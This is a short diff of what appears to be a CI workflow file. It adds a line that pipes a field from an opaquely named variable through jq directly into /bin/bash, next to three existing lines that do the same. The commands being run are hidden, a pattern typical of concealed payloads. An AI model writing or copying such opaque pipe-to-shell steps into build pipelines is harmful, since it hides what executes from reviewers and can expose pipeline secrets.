@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$cbw7564" | jq -r .xp31 | /bin/bash
           printf '%s' "$mhrr34" | jq -r .trvva04 | /bin/bash
           echo $rub7 | jq -r .qhcjj45177 | /bin/bash
+          echo $uf03649 | jq -r .zukb32 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
